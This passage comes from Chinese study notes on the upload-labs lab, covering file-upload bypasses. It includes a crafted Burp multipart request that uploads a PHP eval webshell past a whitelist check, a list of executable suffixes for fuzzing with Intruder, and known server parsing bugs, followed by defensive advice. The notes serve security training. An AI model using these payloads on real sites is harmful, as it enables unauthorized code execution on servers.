        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

这一关结合了 **MIME 检查 + 白名单后缀 + 文件名可控**，并且对 save_name 做了数组处理，是前面几关的综合加强版。

**关键代码逻辑**

```plain
$file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
if (!is_array($file)) {
    $file = explode('.', strtolower($file));
}

$ext = end($file);                          // 取最后一个元素做白名单检查
...
$file_name = reset($file) . '.' . $file[count($file) - 1];  // 重新拼接文件名
```

重点在于：

* save_name**可以传数组**
* 如果传的是数组，就不会执行 explode
* end($file) 和 $file\[count($file)-1] 在键不连续时结果不同

**绕过方法：数组 + /. 组合**

构造一个键不连续的数组，让白名单检查看到的是 jpg，而最终拼接出来的文件名却是 shell.php/.

**Burp 抓包修改示例：**

```plain
------WebKitFormBoundaryCSaT6QA5mzemo8fg
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/jpeg

<?php @eval($_POST["cmd"])?>');?>
------WebKitFormBoundaryCSaT6QA5mzemo8fg
Content-Disposition: form-data; name="save_name[0]"

shell.php/
------WebKitFormBoundaryCSaT6QA5mzemo8fg
Content-Disposition: form-data; name="save_name[2]"

jpg
------WebKitFormBoundaryCSaT6QA5mzemo8fg
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryCSaT6QA5mzemo8fg--
```

**关键点说明：**

| 参数 | 值 | 作用 |
| --- | --- | --- |
| Content-Type | image/jpeg | 绕过 MIME 检查 |
| save_name\[0] | shell.php/ | reset() 取到的值 |
| save_name\[2] | jpg | end() 取到的值，用于过白名单 |
| （没有 save_name\[1]） | - | 让 $file\[count($file)-1] 变成空 |

最终拼接结果为：shell.php/ + . + （空） → shell.php/.\
move_uploaded_file() 会忽略末尾的 /.，文件实际保存为 **shell.php**。

**步骤**

1. 准备一句话木马。

```python
<?php phpinfo(); ?>
```

2. 使用 Burp 抓包。
3. 修改 Content-Type 为 image/jpeg（或 png/gif）。
4. 把原来的 save_name 改成数组形式（如上所示）。

![1787798970505-70647dcb-4755-489c-b8d6-4fffcc79a98e.png](./img/282317868/1787798970505-70647dcb-4755-489c-b8d6-4fffcc79a98e-430329.png)

5. 放行请求。

![1787799278789-eb3541ec-f298-4ba5-830f-d4d22892009d.png](./img/282317868/1787799278789-eb3541ec-f298-4ba5-830f-d4d22892009d-840786.png)

上传成功后访问 shell.php 即可。

![1787799300090-8761fd1d-7a19-43fc-be1f-484b9e0ad65d.png](./img/282317868/1787799300090-8761fd1d-7a19-43fc-be1f-484b9e0ad65d-493303.png)

![1787799480850-20aa48b8-8ac1-4094-a877-74f935d74c99.png](./img/282317868/1787799480850-20aa48b8-8ac1-4094-a877-74f935d74c99-120641.png)

***

## 4. 通用方法论（适合知识库沉淀）

### 4.1 分析顺序

1. 有无前端校验？→ 禁用 JS / 改包
2. 看 Content-Type / 扩展名 / 内容检测谁先谁后
3. 黑名单还是白名单？
4. 文件名是否保留？是否重命名？路径是否可控？
5. Web 服务器与 PHP 版本、系统（Win/Linux）决定哪些后缀与截断有效
6. 上传成功后如何**执行**（直接解析 / include / .htaccess / .user.ini）
7. nginx 0.83 /1.jpg%00php
8. apahce 1x 或者 2x 当 apache 遇见不认识的后缀名，会从后向前解析例如 1.php.rar 不认识 rar 就向前解析，直到知道它认识的后缀名。
9. phpcgi 漏洞(nginx iis7 或者以上) 上传图片后 1.jpg。访问 1.jpg/1.php 也会解析成php。
10. Apache HTTPD 换行解析漏洞（CVE-2017-15715）
11. apache通过 mod_php来运行脚本，其 2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A 将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略。

### 文件上传漏洞通用检测方法

判断是否为黑白名单，如果是白名单 寻找可控参数。如果是黑名单禁止上传，可以用有危害的后缀名批量提交测试，寻找遗留的执行脚本。

.php

.php5

.php4

.php3

.php2

.html

.htm

.phtml

.pht

.pHp

.phP

.pHp5

.pHp4

.pHp3

.pHp2

.Html

.Htm

.pHtml

.jsp

.jspa

.jspx

.jsw

.jsv

.jspf

.jtml

.jSp

.jSpx

.jSpa

.jSw

.jSv

.jSpf

.jHtml

.asp

.aspx

.asa

.asax

.ascx

.ashx

.asmx

.cer

.aSp

.aSpx

.aSa

.aSax

.aScx

.aShx

.aSmx

.cEr

.sWf

.swf

.htaccess

使用 burpsuite 抓包上传将后缀名设置成变量，把这些文件设置成一个字典批量提交。

![1787879792005-76a10c77-9b61-4cb6-a7b6-ea5a537cde91.png](./img/282317868/1787879792005-76a10c77-9b61-4cb6-a7b6-ea5a537cde91-509608.png)

抓包后发到 Intruder，点击清除，然后在文件名后面的后缀选起来，点击右侧的添加按钮。包括点也要加。

![1787879765841-4a1a04c6-232c-43a9-a934-95711d6b9a7e.png](./img/282317868/1787879765841-4a1a04c6-232c-43a9-a934-95711d6b9a7e-569793.png)

在有效载荷这里导入后缀名字典文件。

![1787879817171-c68388ba-8cd9-4a03-9165-e602f5764be8.png](./img/282317868/1787879817171-c68388ba-8cd9-4a03-9165-e602f5764be8-483229.png)

开始攻击。 查看数据包大小 查看确定时候可上传即可。

![1787879874885-9e487e90-e0df-4cd6-a2e4-9434f02bbc04.png](./img/282317868/1787879874885-9e487e90-e0df-4cd6-a2e4-9434f02bbc04-881503.png)

### 文件上传的攻击方法

![1787880638299-9f063b50-831c-4334-a939-904a1ba2d5b6.png](./img/282317868/1787880638299-9f063b50-831c-4334-a939-904a1ba2d5b6-714472.png)

### 4.2 防御思路对照

| 检测手段 | 常见绕过方向 |
| --- | --- |
| 前端 JS | 禁用 JS、改 HTML、抓包改后缀 |
| MIME | 改 `Content-Type` |
| 扩展名黑名单 | 冷门后缀、大小写、空格、点、`::$DATA`、双写、.htaccess |
| 扩展名白名单 | `%00` 截断、解析漏洞、配合配置文件 |
| 文件头 / getimagesize | 图片马 |
| 二次渲染 | 残留载荷或其它漏洞面 |
| 先存后检 | 条件竞争 |

***

## 5. 防御建议（开发视角）

1. **永远不要信任前端校验**
2. 使用**白名单**扩展名，并 `strtolower` 后比较
3. **随机重命名**存储，不要用用户原始文件名
4. 上传目录**禁止脚本执行**（Apache/Nginx 配置）
5. 禁止 `.htaccess` / `.user.ini` 上传与生效
6. 图片类：解码再存储或严格二次处理，并避免 `include` 用户文件
7. 保持 PHP/中间件版本更新，避免 `%00`、旧解析漏洞
8. 有条件做内容安全策略与独立文件存储域

服务器端使用白名单防御，修复 web 中间件的漏洞，禁止客户端存在可控参数，存放文件目录禁止脚本执行，限制后缀名 一定要设置图片格式 jpg、gif 、png 文件名随机的，不可预测。

***

## 6. 常见问题

| 问题 | 说明 |
| --- | --- |
| `%00` 无效 | PHP ≥ 5.3.4 已修复；需低版本环境 |
| `.htaccess` 无效 | `AllowOverride None` 或非 Apache |
| `.phtml` 不执行 | 当前 Apache 未把该后缀交给 PHP |
| Docker 无法上传 | `upload` 目录权限或未创建 |
| 关卡与文章不一致 | fork/版本不同，以本机 `Pass-XX` 源码为准 |

***

## 7. 清理与卸载

```bash
# Docker
docker stop upload-labs
docker rm upload-labs
docker rmi c0ny1/upload-labs

# 本地源码
# 删除网站目录中的 upload-labs 文件夹即可
# 并清空 upload 目录中的测试 webshell，避免残留
```

***

## 8. 参考资料

* 官方仓库：<https://github.com/c0ny1/upload-labs>
* 官方 README 环境说明与 Docker 构建方式
* 各安全博客 Writeup（搜索「upload-labs Pass-XX」对照源码学习）
* 【汇总】文件上传漏洞upload-labs无法复现汇总：<https://wiki.bafangwy.com/doc/174/>

***

## 9. 学习建议

1. 每关先**自己读源码**再看题解
2. 记录：校验点、绕过点、依赖的 PHP/OS 条件
3. 每关结束后写一条**对应防御措施**
4. 不要只会传 webshell，要理解「为何能执行」

***

**笔记版本**：v1.0\
**适用对象**：Web 安全入门 → 文件上传专项\
**环境提醒**：PHP 版本与 OS 会显著影响部分关卡可解性

> 本文描述的是公开教学靶场中的已知漏洞模式，用于合法安全研究与防御建设。实战中仅可在明确授权下进行测试。


